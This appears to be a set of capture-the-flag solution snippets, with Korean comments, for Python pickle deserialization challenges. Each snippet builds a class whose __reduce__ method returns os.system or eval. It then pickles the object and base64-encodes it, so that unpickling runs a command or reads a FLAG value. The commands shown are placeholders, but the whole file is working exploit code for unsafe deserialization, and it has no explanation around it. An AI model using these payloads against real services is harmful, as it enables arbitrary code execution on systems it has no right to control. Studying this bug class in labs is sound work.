import pickle
import os
import base64
class TestClass:
  def __reduce__(self):
  	return os.system, ("read flag.txt", )
ClassA = TestClass()
# ClassA 직렬화
ClassA_dump = base64.b64encode(pickle.dumps(ClassA))
print(ClassA_dump)
# 역직렬화
print(pickle.loads(base64.b64decode(ClassA_dump)))

///////////////////////////////////////////////////////////////////

import os
import pickle
import base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('echo FLAG', ))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)

////////////////////////////////////////////////////////////////

import pickle
import base64
class TestClass:
  def __reduce__(self):
  	return eval, ("{\"name\" : FLAG,\"userid\" : FLAG,\"password\" : FLAG}", )
ClassA = TestClass()
# ClassA 직렬화
ClassA_dump = base64.b64encode(pickle.dumps(ClassA))
print(ClassA_dump)
# 역직렬화
print(pickle.loads(base64.b64decode(ClassA_dump)))
